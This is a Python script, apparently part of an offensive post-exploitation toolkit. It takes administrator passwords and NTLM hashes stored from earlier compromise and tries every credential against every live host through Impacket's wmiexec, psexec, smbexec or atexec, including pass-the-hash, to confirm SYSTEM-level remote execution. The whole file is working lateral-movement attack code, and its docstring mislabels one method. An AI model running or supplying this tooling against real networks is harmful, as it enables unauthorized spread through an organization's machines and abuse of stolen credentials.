#!/usr/bin/env python3
import sys
import os
import argparse
import subprocess

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../..')))

from core.database import DatabaseManager, Credential, Target
from core.logger import setup_logger, get_logger

logger = None

def execute_lateral_movement(session_dir, method="wmiexec"):
    """
    Execute lateral movement using multiple methods:
    - wmiexec: WMI-based execution
    - psexec: SMB-based execution  
    - wmiexec: WinRM-based execution
    """
    global logger
    setup_logger(f"lateral_{method}", session_dir)
    logger = get_logger(f"lateral_{method}")
    
    db_path = os.path.join(session_dir, "session.db")
    db = DatabaseManager(db_path)
    
    logger.info(f"Starting lateral movement via {method.upper()}")
    
    # Get admin credentials and targets
    session = db.get_session()
    admin_creds = session.query(Credential).filter_by(is_admin=True).all()
    targets = session.query(Target).filter_by(is_alive=True).all()
    session.close()
    
    if not admin_creds:
        logger.warning("No admin credentials available")
        return
    
    if not targets:
        logger.warning("No targets available")
        return
    
    logger.info(f"Testing {len(admin_creds)} admin creds against {len(targets)} targets")
    
    success_count = 0
    
    # Select the appropriate Impacket script
    script_map = {
        "wmiexec": "wmiexec.py",
        "psexec": "psexec.py",
        "smbexec": "smbexec.py",
        "atexec": "atexec.py"
    }
    
    script_name = script_map.get(method, "wmiexec.py")
    
    for cred in admin_creds:
        for target in targets:
            # Build credential string
            if cred.password:
                auth = f"{cred.domain}/{cred.username}:{cred.password}"
                hash_arg = None
            elif cred.ntlm_hash:
                auth = f"{cred.domain}/{cred.username}"
                hash_arg = f":{cred.ntlm_hash}"
            else:
                continue
            
            logger.info(f"Attempting {method}: {cred.username} → {target.ip_address}")
            
            # Build command
            cmd = [script_name, auth]
            if hash_arg:
                cmd.extend(["-hashes", hash_arg])
            
            cmd.extend([
                f"@{target.ip_address}",
                "whoami"  # Test command
            ])
            
            try:
                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                
                if result.returncode == 0 and "nt authority\\system" in result.stdout.lower():
                    logger.info(f"[SUCCESS] {method.upper()} to {target.ip_address}")
                    success_count += 1
                    
                    # Store lateral movement in DB (future: LateralMovement table)
                    
            except subprocess.TimeoutExpired:
                logger.debug(f"Timeout: {target.ip_address}")
            except FileNotFoundError:
                logger.error(f"{script_name} not found. Install Impacket.")
                return
            except Exception as e:
                logger.debug(f"Failed {target.ip_address}: {e}")
    
    logger.info(f"Lateral movement complete: {success_count}/{len(targets)} successful")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--session-dir", required=True)
    parser.add_argument("--method", choices=["wmiexec", "psexec", "smbexec", "atexec"], default="wmiexec")
    args = parser.parse_args()
    
    execute_lateral_movement(args.session_dir, args.method)
